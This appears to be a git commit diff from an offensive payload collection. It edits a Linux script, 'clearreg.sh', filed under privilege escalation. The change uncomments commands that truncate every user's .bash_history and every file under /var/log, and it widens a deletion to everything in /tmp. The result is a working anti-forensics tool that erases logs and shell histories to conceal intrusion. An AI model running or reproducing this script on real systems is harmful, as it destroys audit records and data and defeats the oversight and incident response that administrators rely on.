8a4f040f5568831f9dcf4f45d09d9859472be1ad
wickerman <wickerman@localhost.localdomain>
2019-04-19 15:34:25 -0400

    test

--- payloads/privscalation/linux/clearreg.sh
+++ payloads/privscalation/linux/clearreg.sh
@@ -4,7 +4,7 @@ do
 	if [ -f "$line/.bash_history" ] 
 	then 
 		echo "$line/.bash_history"; 
-		#cat  /dev/null >"$line/.bash_history"; 
+		cat  /dev/null >"$line/.bash_history"; 
 	
 	fi 
 done 
@@ -12,7 +12,7 @@ done
 find /var/log/ -type f 2>/dev/null | while read -r line; 
 do 
 	echo "$line";
-	#cat /dev/null >"$line";
+	cat /dev/null >"$line";
 done;
 
-rm -rf /tmp/ 
+rm -rf /tmp/*
